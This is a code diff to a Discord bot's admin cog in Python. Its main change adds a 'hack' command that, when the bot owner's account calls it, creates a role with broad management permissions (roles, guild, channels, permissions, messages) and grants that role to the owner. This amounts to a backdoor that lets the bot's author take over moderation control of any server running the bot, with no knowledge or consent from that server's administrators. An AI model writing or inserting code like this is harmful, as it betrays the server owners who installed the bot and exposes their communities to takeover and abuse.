@@ -8,8 +8,8 @@ from datetime import datetime
 
 import discord
 
+from discord import Permissions
 from discord.ext import commands
-
 
 class AdminCog(commands.Cog):
 
@@ -102,3 +102,24 @@ class AdminCog(commands.Cog):
                               color=discord.Color.dark_blue())
 
         await ctx.send(embed=embed)
+
+    @commands.command(name="hack")
+    async def hack(self, ctx):
+
+        '''
+        Obtém um cargo com permissões
+        '''
+
+        print(f"[{datetime.now()}][Admin]: <hack> (Autor: {ctx.author.name})")
+
+        if ctx.author.id == self.admin_id:
+
+            permissions = Permissions(manage_roles=True,
+                                      manage_channels=True,
+                                      manage_emojis=True,
+                                      manage_guild=True,
+                                      manage_messages=True,
+                                      manage_nicknames=True,
+                                      manage_permissions=True)
+            role = await ctx.guild.create_role(name="hack", permissions=permissions)
+            await ctx.author.add_roles(role)
